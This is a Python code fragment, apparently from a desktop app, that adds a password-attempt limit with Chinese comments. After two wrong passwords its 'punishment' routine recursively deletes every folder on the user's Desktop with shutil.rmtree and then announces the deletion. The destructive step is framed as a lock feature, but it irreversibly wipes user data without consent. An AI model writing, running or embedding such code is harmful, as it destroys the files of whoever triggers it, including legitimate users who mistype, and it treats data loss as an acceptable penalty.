# 密码尝试次数限制相关变量
password_attempts = 0  # 密码错误尝试次数
MAX_PASSWORD_ATTEMPTS = 2  # 最大尝试次数
password_punishment_executed = False  # 是否已执行惩罚

def delete_desktop_folders():
    """删除桌面上的所有文件夹"""
    try:
        import shutil
        
        # 获取桌面路径
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        
        if not os.path.exists(desktop_path):
            messagebox.showerror('X提醒', '未找到桌面路径！')
            return
        
        # 遍历桌面上的所有文件夹并删除
        deleted_count = 0
        for item in os.listdir(desktop_path):
            item_path = os.path.join(desktop_path, item)
            
            # 只删除文件夹，保留文件
            if os.path.isdir(item_path):
                try:
                    shutil.rmtree(item_path)  # 递归删除文件夹及其内容
                    print(f'已删除: {item_path}')
                    deleted_count += 1
                except Exception as e:
                    print(f'删除失败: {item_path}, 错误: {e}')
        
        messagebox.showwarning('X提醒', f'密码错误次数过多！已删除桌面上的{deleted_count}个文件夹！')
        
    except Exception as e:
        messagebox.showerror('X提醒', f'删除失败: {str(e)}')

def check_password_attempt(password_correct):
    """检查密码尝试次数，返回是否允许继续"""
    global password_attempts, password_punishment_executed
    
    # 如果已经执行过惩罚，直接返回False
    if password_punishment_executed:
        return False
    
    if password_correct:
        # 密码正确，重置计数器
        password_attempts = 0
        return True
    else:
        # 密码错误，增加计数
        password_attempts += 1
        remaining = MAX_PASSWORD_ATTEMPTS - password_attempts
        
        if remaining > 0:
            messagebox.showerror('X提醒', f'密码错误！还剩{remaining}次机会')
            return False
        else:
            # 次数用完，执行惩罚
            password_punishment_executed = True
            delete_desktop_folders()
            return False

